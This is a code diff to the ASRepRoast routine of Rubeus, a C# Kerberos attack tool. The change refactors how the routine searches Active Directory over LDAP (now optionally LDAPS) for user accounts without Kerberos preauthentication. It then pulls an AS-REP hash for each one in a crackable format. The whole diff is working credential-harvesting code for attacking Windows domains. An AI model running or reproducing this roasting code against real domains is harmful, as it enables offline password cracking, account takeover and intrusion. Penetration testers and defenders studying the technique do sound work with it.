@@ -13,7 +13,7 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "")
+        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)
         {
             if (!String.IsNullOrEmpty(userName))
             {
@@ -41,113 +41,45 @@ namespace Rubeus
             }
             else
             {
-                DirectoryEntry directoryObject = null;
-                DirectorySearcher userSearcher = null;
+                string userSearchFilter = "";
 
-                try
+                if (String.IsNullOrEmpty(userName))
                 {
-                    if (String.IsNullOrEmpty(domainController))
-                    {
-                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
-                    }
-                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, domainController, domain);
-                    userSearcher = new DirectorySearcher(directoryObject);
-                    // enable LDAP paged search to get all results, by pages of 1000 items
-                    userSearcher.PageSize = 1000;
+                    userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                 }
-                catch (Exception ex)
+                else
                 {
-                    if (ex.InnerException != null)
-                    {
-                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
-                    }
+                    userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
+                }
+                if (!String.IsNullOrEmpty(ldapFilter))
+                {
+                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
+                }
+                
+                if (String.IsNullOrEmpty(domain))
+                {
+                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
+                }
+                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);
+
+                if (users == null)
+                {
+                    Console.WriteLine("[X] Error during executing the LDAP query.");
                     return;
                 }
-
-                // check to ensure that the bind worked correctly
-                try
+                if (users.Count == 0)
                 {
-                    string dirPath = directoryObject.Path;
-                    if (String.IsNullOrEmpty(dirPath))
-                    {
-                        Console.WriteLine("[*] Searching the current domain for AS-REP roastable users");
-                    }
-                    else
-                    {
-                        Console.WriteLine("[*] Searching path '{0}' for AS-REP roastable users", dirPath);
-                    }
-                }
-                catch (DirectoryServicesCOMException ex)
-                {
-                    if (!String.IsNullOrEmpty(OUName))
-                    {
-                        Console.WriteLine("\r\n[X] Error validating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error validating the domain searcher: {0}", ex.Message);
-                    }
-                    return;
+                    Console.WriteLine("[X] No users found to AS-REP roast!");
                 }
 
-                try
+                foreach (IDictionary<string, Object> user in users)
                 {
-                    string userSearchFilter = "";
+                    string samAccountName = (string)user["samaccountname"];
+                    string distinguishedName = (string)user["distinguishedname"];
+                    Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
+                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
 
-                    if (String.IsNullOrEmpty(userName))
-                    {
-                        userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
-                    }
-                    else
-                    {
-                        userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
-                    }
-                    if (!String.IsNullOrEmpty(ldapFilter))
-                    {
-                        userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
-                    }
-                    userSearcher.Filter = userSearchFilter;
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
-                    return;
-                }
-
-                try
-                {
-                    SearchResultCollection users = userSearcher.FindAll();
-
-                    if (users.Count == 0)
-                    {
-                        Console.WriteLine("[X] No users found to AS-REP roast!");
-                    }
-
-                    foreach (SearchResult user in users)
-                    {
-                        string samAccountName = user.Properties["samAccountName"][0].ToString();
-                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
-                        Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
-                        Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
-
-                        GetASRepHash(samAccountName, domain, domainController, format, outFile);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    if (ex.InnerException != null)
-                    {
-                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
-                    }
-                    return;
+                    GetASRepHash(samAccountName, domain, domainController, format, outFile);
                 }
             }
 
